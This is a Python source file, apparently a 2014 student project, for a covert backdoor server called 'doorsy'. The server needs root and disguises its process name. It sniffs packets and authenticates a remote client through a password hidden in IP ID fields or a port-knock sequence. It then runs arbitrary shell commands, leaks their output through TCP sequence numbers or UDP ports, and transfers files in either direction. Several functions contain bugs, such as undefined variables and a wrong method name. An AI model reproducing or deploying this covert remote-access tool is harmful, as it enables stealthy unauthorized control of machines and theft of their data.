'''
--------------------------------------------------------------------------------------------
-- SCRIPT: doorsy-server.py
-- 
-- FUNCTIONS: main
-- 
-- DATE: 2014-11-09
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
from config import *
from encrypt import *
from scapy.all import *
import setproctitle
import os
import thread
import time
import subprocess

'''
------------------------------------------------------------------------------
-- 
-- FUNCTION: main
-- 
-- DATE: 2014-11-09
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: main()
-- 
-- RETURNS: void
-- 
-- NOTES: 
-- 
------------------------------------------------------------------------------
'''
def main():
	# Making sure we're running in root
	if os.geteuid() != 0:
		print "Program must be run as root"
		return

	# Making sure we have at least 1 password or knock.
	# We need either a password or a knock in order for remote access to work
	if len(passwords) < 1 and len(knock) < 1:
		print "Check Config: Program must have at least 1 password or knock sequence"
		return
	else:
		# Masking the process name
		if len(mask) > 1:
			setproctitle.setproctitle(mask)
		try:
			# Setting up the packet filter to limit scanned packets
			# The stricter the filter, the fewer packets to process and therefore the better the performance
			packetFilter = protocol + " and ip src not 127.0.0.1"
			if len(sources) > 0:
				first = True
				for source in sources:
					if first:
						packetFilter = packetFilter + "and (ip src " + source
						first = False
					else:
						packetFilter = packetFilter + " or ip src " + source
				packetFilter = packetFilter + ")"

			if len(logFile) > 0:
				with open(logFile, "a") as serverLog:
					serverLog.write("Server starting up at " + time.ctime() + "\n")

			# Beginning Packet sniffing
			sniff(filter=packetFilter, prn=server())
		except KeyboardInterrupt:
			if len(logFile) > 0:
				with open(logFile, "a") as serverLog:
					serverLog.write("Server shutting down at " + time.ctime() + "\n")

'''
------------------------------------------------------------------------------
-- 
-- FUNCTION: server
-- 
-- DATE: 2014-11-09
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: server()
-- 
-- RETURNS: void
-- 
-- NOTES: 
-- 
------------------------------------------------------------------------------
'''
def server():
	def getResponse(packet):
		if packet.haslayer(TCP):
			# Check for the reset port first
			for port in reset:
				if port == packet[TCP].sport:
					for src, word in passCheck:
						if src == packet[IP].src:
							passCheck.remove([src, word])
							return
					return

			# Append our password and knock arrays with the next value for each and, when apropriate,
			# check if they are valid passphrases/knock sequences.
			if len(passwords) > 0:
				if checkPassword(packet[IP].src, packet[IP].id):
					if len(knock) > 0:
						if checkKnock(packet[IP].src, packet[TCP].dport):
							thread.start_new_thread(clientCommands, (packet))
					else:
						thread.start_new_thread(clientCommands, (packet))
			elif len(knock) > 0:
				if checkKnock(packet[IP].src, packet[TCP].dport):
					thread.start_new_thread(clientCommands, (packet,))
		elif packet.haslayer(UDP):
			# Check for the reset port first
			for port in reset:
				if port == packet[UDP].sport:
					for src, word in passCheck:
						if src == packet[IP].src:
							passCheck.remove([src, word])
							return
					return

			# Append our password and knock arrays with the next value for each and, when apropriate,
			# check if they are valid passphrases/knock sequences.
			if len(passwords) > 0:
				if checkPassword(packet[IP].src, packet[IP].id):
					if len(knock) > 0:
						if checkKnock(packet[IP].src, packet[UDP].dport):
							thread.start_new_thread(clientCommands, (packet))
					else:
						thread.start_new_thread(clientCommands, (packet))
			elif len(knock) > 0:
				if checkKnock(packet[IP].src, packet[UDP].dport):
					thread.start_new_thread(clientCommands, (packet))
	return getResponse

'''
------------------------------------------------------------------------------
-- 
-- FUNCTION: checkPassword
-- 
-- DATE: 2014-11-09
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: checkPassword(ip, ipid)
--              ip   - The IP Address from which the packet was received
--              ipid - The ipid of the received packet
-- 
-- RETURNS: True on password match, otherwise False
-- 
-- NOTES: 
-- 
------------------------------------------------------------------------------
'''
passCheck = []
def checkPassword(ip, ipid):
	found = False
	c = chr(ipid & 0x00FF)
	for i in range(0, len(passCheck)):
		if passCheck[i][0] == ip:
			passCheck[i][1] += c
			
			tooLong = True
			for password in passwords:
				# Only compare to passwords short enough to be contained within the password buffer
				if len(passCheck[i][1]) >= len(password):
					if password in passCheck[i][1]:
						passCheck.pop(i)
						return True
				elif len(knock) == 0:
					tooLong = False

			# If the knock is disabled, clear the buffer once it's longer than the longest password
			if tooLong and len(knock) == 0:
				passCheck.pop(i)
			found = True
			break

	if found == False:
		passCheck.append([ip, str(c)])
	return False

'''
------------------------------------------------------------------------------
-- 
-- FUNCTION: checkKnock
-- 
-- DATE: 2014-11-09
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: checkKnock(ip, port)
--              ip   - The IP Address from which the packet was received
--              port - The destination port of the received packet
-- 
-- RETURNS: True on password match, otherwise False
-- 
-- NOTES: 
-- 
------------------------------------------------------------------------------
'''
knockCheck = []
def checkKnock(ip, port):
	found = False
	for i in range(0, len(knockCheck)):
		if knockCheck[i][0] == ip:
			knockCheck[i][1].append(port)
			
			# Once we've collected enough knocks, check for a valid sequence
			if len(knockCheck[i][1]) == len(knock):
				goodKnock = True
				for j in range(0, len(knock)):
					if knock[j] != knockCheck[i][1][j]:
						goodKnock = False
				if goodKnock:
					knockCheck.pop(i)
					return True
				else:
					# If it's invalid then flush the buffer
					knockCheck.pop(i)
					return False

			found = True
			break
	if found == False:
		knockCheck.append([ip, [port]])
	return False

'''
------------------------------------------------------------------------------
-- 
-- FUNCTION: clientCommands
-- 
-- DATE: 2014-11-09
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: clientCommands(packet)
--              packet - The last packet received in the password/knock sequence
-- 
-- RETURNS: void
-- 
-- NOTES: 
-- 
------------------------------------------------------------------------------
'''
def clientCommands(packet):
	if len(logFile) > 0:
		with open(logFile, "a") as serverLog:
			serverLog.write("Connection Established with " + packet[IP].src + " at " + time.ctime() + "\n")

	ipid = random.randint(0, 65535)

	if packet.haslayer(TCP):
		seq = random.randint(0, 16777215)
		confirmPacket = IP(dst=packet[IP].src, id=ipid)/\
			            TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, seq=seq)
		if (len(ports) > 0) and (packet[TCP].sport not in ports):
			confirmPacket[TCP].sport = random.choose(ports)
		port = packet[TCP].sport
	elif packet.haslayer(UDP):
		confirmPacket = IP(dst=packet[IP].src, id=ipid)/\
			            UDP(sport=packet[UDP].dport, dport=packet[UDP].sport, seq=seq)
		if (len(ports) > 0) and (packet[UDP].sport not in ports):
			confirmPacket[UDP].sport = random.choose(ports)
		port = packet[UDP].sport

	send(confirmPacket, verbose=0)

	try:
		# Setting up the packet filter to limit scanned packets
		# The stricter the filter, the fewer packets to process and therefore the better the performance
		packetFilter = protocol + " and ip src " + packet[IP].src + " and dst port " + str(port)
		# Beginning Packet sniffing
		sniff(filter=packetFilter, prn=commandParser(), timeout=300)
		if len(logFile) > 0:
			with open(logFile, "a") as serverLog:
				serverLog.write("Connection with " + packet[IP].src + " timeout at " + time.ctime() + "\n")

	except SystemExit:
		if len(logFile) > 0:
			with open(logFile, "a") as serverLog:
				serverLog.write("Connection with " + packet[IP].src + " terminated at " + time.ctime() + "\n")

'''
------------------------------------------------------------------------------
-- 
-- FUNCTION: commandParser
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: commandParser()
-- 
-- RETURNS: void
-- 
-- NOTES: 
--
-- --Server Codes--
--       A S F 
--       C Y I 
--       K N N Flag
-- sFile 0 0 0 N/A   0000 0001
-- gFile 1 0 0 A     0000 0010
-- termi 0 1 0 S     0000 0100
-- iNoti 1 1 0 AS    0000 1000
-- Kill  0 0 1 F     0001 0000
------------------------------------------------------------------------------
'''
def commandParser():
	def getResponse(packet):
		if packet.haslayer(TCP):
			# Kill
			if packet[TCP].flags == 1:
				sys.exit()
			# iNotify
			elif packet[TCP].flags == 14:
				notify(packet)
			# Terminal Command
			elif packet[TCP].flags == 2:
				terminal(packet)
			# Client receives file
			elif packet[TCP].flags == 16:
				getFile(packet)
			# Client sends file
			elif packet[TCP].flags == 0:
				sendFile(packet)
		elif packet.haslayer(UDP):
			# Kill
			if packet[UDP].sport & 0x0010 == 0x0010:
				sys.exit()
			# iNotify
			elif packet[UDP].sport & 0x0008 == 0x0008:
				notify(packet)
			# Terminal Command
			elif packet[UDP].sport & 0x0004 == 0x0004:
				terminal(packet)
			# Client receives file
			elif packet[UDP].sport & 0x0002 == 0x0002:
				getFile(packet)
			# Client sends file
			elif packet[UDP].sport & 0x0001 == 0x0001:
				sendFile(packet)

	return getResponse

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: sendFile
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: sendFile(packet)
--              packet - The command packet
-- 
-- RETURNS: N/A
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
def sendFile(packet):
	if packet.haslayer(TCP):
		with open(packet[Raw].load, "w") as tFile:
			while True:
				dPacket = sniff(filter=protocol + " sport " + str(packet[TCP].sport) + " and ip src " + packet[IP].src, count=1, timeout=30)
				if len(dPacket) == 0:
					break
				if "F" in dPacket[0][TCP].flags:
					break
				tFile.write(dPacket[Raw].load)
	elif packet.haslayer(UDP):
		with open(packet[Raw].load, "w") as tFile:
			while True:
				dPacket = sniff(filter=protocol + " sport " + str(packet[UDP].sport) + " and ip src " + packet[IP].src, count=1, timeout=30)
				if len(dPacket) == 0:
					break
				if "F" in dPacket[0][UDP].flags:
					break
				tFile.write(dPacket[Raw].load)

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: getFile
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: getFile(packet)
--              packet - The command packet
-- 
-- RETURNS: N/A
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
def getFile(packet):
	if packet.haslayer(TCP):
		dPacket = IP(dst=packet[IP].src, id=random.randint(0, 65535))/\
			      TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, seq=random.randint(0, 16777215))/\
			      Raw(LOAD="")
		with open(packet[Raw].load, "r") as tFile:
			for line in tFile:
				dPacket[IP].id = dPacket[IP].id + 1
				dPacket[TCP].seq = dPacket[TCP].seq + 1
				dPacket[Raw].load = encrypt(line)
				send(dPacket, verbose=0)
		dPacket[IP].id = commandPacket[IP].id + 1
		dPacket[TCP].seq = commandPacket[TCP].seq + 1
		dPacket[Raw].load = ""
		dPacket[TCP].flags="F"
		send(commandPacket, verbose=0)
	elif packet.haslayer(UDP):
		dPacket = IP(dst=packet[IP].src, id=random.randint(0, 65535))/\
			      UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)/\
			      Raw(LOAD="")
		with open(packet[Raw].load, "r") as tFile:
			for line in tFile:
				dPacket[IP].id = dPacket[IP].id + 1
				dPacket[Raw].load = encrypt(line)
				send(dPacket, verbose=0)
		dPacket[IP].id = commandPacket[IP].id + 1
		dPacket[Raw].load = ""
		dPacket[UDP].flags="F"
		send(commandPacket, verbose=0)

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: terminal
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: terminal(packet)
--              packet - The command packet
-- 
-- RETURNS: N/A
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
def terminal(packet):
	output = encrypt(subprocess.check_output(packet[Raw].load.split(), stderr=subprocess.STDOUT))
	print output
	if packet.haslayer(TCP):
		confirmPacket = IP(dst=packet[IP].src, id=packet[IP].id+1)/\
			            TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, seq=packet[TCP].seq+1)

		for i in range(0, len(output), 4):
			time.sleep(0.1)
			confirmPacket[TCP].seq = 0
			for char in output[i:i+4]:
				confirmPacket[TCP].seq = confirmPacket[TCP].seq<<8
				confirmPacket[TCP].seq = confirmPacket[TCP].seq + ord(char)

			send(confirmPacket, verbose=0)

		confirmPacket[TCP].seq = confirmPacket[TCP].seq + 1
		confirmPacket[TCP].flags = "F"
	elif packet.haslayer(UDP):
		confirmPacket = IP(dst=packet[IP].src, id=packet[IP].id+1)/\
			            UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)

		for i in range(0, len(output), 2):
			confirmPacket[UDP].sport = 0
			for char in output[i:i+2]:
				confirmPacket[UDP].sport = confirmPacket[UDP].sport<<8
				confirmPacket[UDP].sport = confirmPacket[UDP].sport + ord(char)

			send(confirmPacket, verbose=0)

		confirmPacket[UDP].sport = "0"

	send(confirmPacket, verbose=0)
		
	if len(logFile) > 0:
		with open(logFile, "a") as serverLog:
			serverLog.write("Results of \"" + packet[Raw].load + "\" sent to " + packet[IP].src + " at " + time.ctime() + "\n")

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: notify
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: notify(packet)
--              packet - The command packet
-- 
-- RETURNS: N/A
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
def notify(packet):
	print "Do stuff"


main()

